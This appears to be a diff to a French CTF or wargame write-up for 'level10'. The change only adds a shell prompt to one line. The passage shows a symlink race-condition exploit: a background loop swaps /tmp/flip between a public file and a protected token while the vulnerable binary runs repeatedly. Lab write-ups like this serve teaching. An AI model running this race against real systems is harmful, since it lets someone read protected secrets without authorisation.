@@ -78,7 +78,7 @@ On ouvre 2 connections ssh:
 	$ ln -sf /tmp/public /tmp/flip		# creation d'un lien symbolique
 	Si on lance notre binaire avec /tmp/public ou /tmp/flip, on aura exactement la meme chose.
 	
-	while true; do ln -sf $(pwd)/token /tmp/flip; ln -sf /tmp/public /tmp/flip; done &
+	$ while true; do ln -sf $(pwd)/token /tmp/flip; ln -sf /tmp/public /tmp/flip; done &
 	$ for i in {1..300}; do ./level10 /tmp/flip 127.0.0.1; done
 ```
 
